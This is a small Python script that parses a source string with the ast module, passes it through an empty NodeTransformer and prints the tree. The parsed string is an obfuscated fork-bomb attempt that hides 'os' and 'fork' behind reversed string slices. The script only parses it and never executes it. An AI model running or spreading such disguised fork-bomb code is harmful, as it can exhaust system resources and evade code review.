import ast


class MyOptimizer(ast.NodeTransformer):

    def visit_Module(self, module):
        return module


tree = ast.parse("""while True : __import__( ''.join('so'[2::-1]).__dict__['karloff'[::-2]]() )""")
# print(ast.dump(line))

optimizer = MyOptimizer()
tree = optimizer.visit(tree)
print(ast.dump(tree))

#
# Module(
#     body=[
#         While(
#             test=Constant(value=True, kind=None),
#             body=[
#                 Expr(
#                     value=Call(
#                         func=Name(
#                             id='__import__',
#                             ctx=Load()),
#                         args=[
#                             Call(
#                                 func=Subscript(
#                                     value=Attribute(
#                                         value=Call(
#                                             func=Attribute(
#                                                 value=Constant(value='', kind=None),
#                                                 attr='join', ctx=Load()),
#                                             args=[
#                                                 Subscript(
#                                                     value=Constant(value='so', kind=None),
#                                                     slice=Slice(
#                                                         lower=Constant(value=2, kind=None),
#                                                         upper=None,
#                                                         step=UnaryOp(
#                                                             op=USub(),
#                                                             operand=Constant(value=1, kind=None)
#                                                         )
#                                                     ),
#                                                     ctx=Load()
#                                                 )
#                                             ],
#                                             keywords=[]), attr='__dict__', ctx=Load()), slice=Index(value=Subscript(value=Constant(value='karloff', kind=None), slice=Slice(lower=None, upper=None, step=UnaryOp(op=USub(), operand=Constant(value=2, kind=None))), ctx=Load())), ctx=Load()), args=[], keywords=[])], keywords=[]))], orelse=[])], type_ignores=[])
